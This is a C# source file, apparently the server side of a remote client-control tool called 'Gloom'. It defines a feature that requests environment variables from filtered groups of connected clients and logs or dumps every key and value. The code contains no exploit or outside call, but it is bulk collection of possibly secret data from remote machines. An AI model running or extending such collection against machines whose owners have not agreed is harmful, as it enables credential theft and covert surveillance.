using Serilog;

namespace Gloom.Server.Features.InfoCollector
{
	internal class EnvVarsCollector : FeatureBase
	{
		public override Guid[] AcceptedOps => new Guid[] { OpCodes.EnvVarsResponse };
		private string? saveToSpecificFile = null;

		public EnvVarsCollector(IMessageSender sender) : base(sender, "env")
		{

		}

		public override async Task HandleAsync(Client client, Guid op, byte[] data)
		{
			var str = data.Deserialize<OpStructs.EnvVarsResponse>();
			if (!string.IsNullOrEmpty(saveToSpecificFile))
			{
				using var writer = File.AppendText(saveToSpecificFile);
				foreach ((var key, var value) in str.Map)
					await writer.WriteLineAsync($"{key} = {value}");
			}
			else
			{
				foreach ((var key, var value) in str.Map)
					Log.Information("[EnvVars of {client}] {key} = {value}", client, key, value);
			}
		}

		public override async Task<bool> HandleCommandAsync(string[] args)
		{
			if (args.Length == 0)
				return false;
			var filter = Filter.Parse(args[0]);
			var count = await SendAsync(filter, OpCodes.EnvVarsRequest, new OpStructs.EnvVarsRequest());
			if (args.Length >= 2 && !string.IsNullOrWhiteSpace(args[1]))
			{
				try
				{
					saveToSpecificFile = Path.GetFullPath(args[1]);
				}
				catch
				{
					//https://stackoverflow.com/questions/3137097/check-if-a-string-is-a-valid-windows-directory-folder-path
					saveToSpecificFile = $"Environment variable list dump on {DateTime.Now:yyyy-MM-dd-HH-mm-ss.ffff}";
				}
			}

			Log.Information("Sent environment variable list request to total {count} clients.", count);
			return true;
		}
	}
}